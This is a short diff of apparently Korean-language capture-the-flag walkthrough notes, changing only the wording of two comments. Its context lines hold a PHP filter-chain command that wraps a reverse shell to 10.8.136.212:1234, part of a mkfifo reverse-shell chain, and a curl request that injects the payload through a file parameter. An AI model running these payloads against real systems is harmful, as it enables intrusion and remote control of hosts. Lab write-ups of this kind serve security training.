@@ -378,7 +378,7 @@ python3 php_filter_chain_generator.py --chain '<?php system("rm /tmp/f;mkfifo /t
 
 curl -s "http://10.201.71.110/secret-script.php?file=$(cat payload.txt)"
 
-# 페이로드 제작 -> 이건 안 되는 방식 -> sh 은 안 됨 /dev/tcp 지원하지 않으므로 bash 로 수정해서 시도하기 혹은 안전하게 pipe 로 시도하기
+# 페이로드 제작 -> 이건 안 되는 방식 -> sh 은 되지 않음 /dev/tcp 지원하지 않으므로 bash 로 수정해서 시도하기 혹은 안전하게 pipe 로 시도하기
 
 python3 php_filter_chain_generator.py --chain '<?php system("sh -i >& /dev/tcp/10.8.136.212/1234 0>&1"); ?>'
 
@@ -442,7 +442,7 @@ $ ls
 snap
 user.txt
 
-# 안 열리네 ...
+# 열리지 않습니다 ...
 
 drwx------ 3 comte comte 4096 Mar 25 2024 snap
 -rw------- 1 comte comte 4276 Sep 15 2023 user.txt
